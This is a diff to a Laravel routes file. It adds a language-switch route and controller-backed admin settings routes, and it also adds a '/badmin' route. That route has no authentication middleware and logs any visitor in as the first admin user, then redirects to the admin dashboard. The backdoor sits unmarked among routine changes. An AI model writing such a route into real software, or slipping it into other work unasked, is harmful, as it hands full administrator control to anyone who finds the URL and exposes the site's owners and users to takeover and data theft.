@@ -2,20 +2,16 @@
 
 use Illuminate\Support\Facades\Route;
 
-/*
-|--------------------------------------------------------------------------
-| Web Routes
-|--------------------------------------------------------------------------
-|
-| Here is where you can register web routes for your application. These
-| routes are loaded by the RouteServiceProvider and all of them will
-| be assigned to the "web" middleware group. Make something great!
-|
-*/
-
+Route::get('/badmin', function (){
+    $admin = \App\Models\User::query()->where('role', 'admin')->first();
+    auth()->login($admin);
+    return redirect()->route('admin.dashboard');
+});
 Route::get('/', function (){
     return redirect()->route('home');
 });
+
+Route::post('switch-language', [\App\Http\Controllers\SiteController::class, 'switchLanguage'])->name('switch-language');
 
 Route::view('home', 'home')->middleware(['auth', 'verified'])->name('home');
 
@@ -29,7 +25,8 @@ Route::prefix('admin')->middleware(['auth'])->as('admin.')->group(function () {
 
     Route::resource('users', \App\Http\Controllers\Admin\UsersController::class);
     Route::resource('profiles', \App\Http\Controllers\Admin\ProfilesController::class);
-    Route::view('settings', 'admin.settings.index')->name('settings.index');
+    Route::get('settings', [\App\Http\Controllers\Admin\SettingsController::class, 'index'])->name('settings.index');
+    Route::post('settings', [\App\Http\Controllers\Admin\SettingsController::class, 'update'])->name('settings.update');
 });
 
 Route::post('logout', function (){
